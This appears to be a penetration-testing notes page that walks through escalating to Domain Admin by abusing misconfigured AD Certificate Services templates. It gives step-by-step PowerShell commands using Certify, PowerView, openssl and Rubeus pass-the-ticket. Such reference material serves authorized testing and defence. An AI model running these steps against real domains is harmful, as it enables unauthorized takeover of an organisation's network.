---
title: Attacking Active Directory Certificate Services
tags:
  - breach
  - operations
  - attack
  - active
  - directory
  - certificates
  - services
  - service
  - certificate
---

A majority of the discussion in this section references
[a SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
paper on abusing Active Directory Certificate Services (ADCS).

## Misconfigured certificate templates

We can use the [Certify](https://github.com/GhostPack/Certify) toolkit to
identify vulnerable certificate templates by invoking the following:

```powershell
Start-Process `
	-FilePath ".\Certify.exe" `
	-ArgumentList @(
		"find",
		"/vulnerable"
	)
```

If we identify a vulnerable certificate template that enables low-privileged
users to enroll certificates with an alternative subject name and that allow
user login, we can use
[PowerSploit's PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
tool to identify Domain Administrators by invoking the following:

```powershell
. .\PowerView.ps1
Get-DomainGroupMember -Identity 'Domain Admins'
```

Finding a valid Domain Admin, we can use the **Certify** toolkit again to enroll
a certificate:

```powershell
Start-Process `
	-FilePath ".\Certify.exe" `
	-ArgumentList @(
		"request",
		"/ca:${DOMAIN}\${DOMAIN_CONTROLLER}",
		"/template:${TEMPLATE_NAME}",
		"/altname:${DOMAIN_ADMIN_USERNAME}"
	)
```

After successfully enrolling a certificate, a certificate will be printed to
`stdout` starting with `-----BEGIN RSA PRIVATE KEY-----`. Write all of the
contents of the certificate to a `.pem` file so we can operate on it. Using
**openssl**, we can convert the certificate to a `.pfx` file:

```powershell
Start-Process `
	-FilePath "openssl" `
	-ArgumentList @(
		"pkcs12",
		"-in",
		"${PEM_FILE}",
		"-keyex",
		"-CSP",
		"'Microsoft Enhanced Cryptographic Provider v1.0'",
		"-export",
		"-out",
		"${OUTFILE}.pfx"
	)
```

With our new `.pfx` certificate in hand, we can use
[Rubeus](https://github.com/GhostPack/Rubeus) to request a **Ticket Granting
Ticket (TGT)** by invoking the following, injecting the TGT into our user's
memory:

```powershell
Start-Process `
	-FilePath ".\Rubeus.exe" `
	-ArgumentList @(
		"asktgt",
		"/user:${DOMAIN_ADMIN_USERNAME}",
		"/certificate:${OUTFILE}.pfx",
		"/password:${CERTIFICATE_PASSWORD}",
		"/ptt"
	)
```
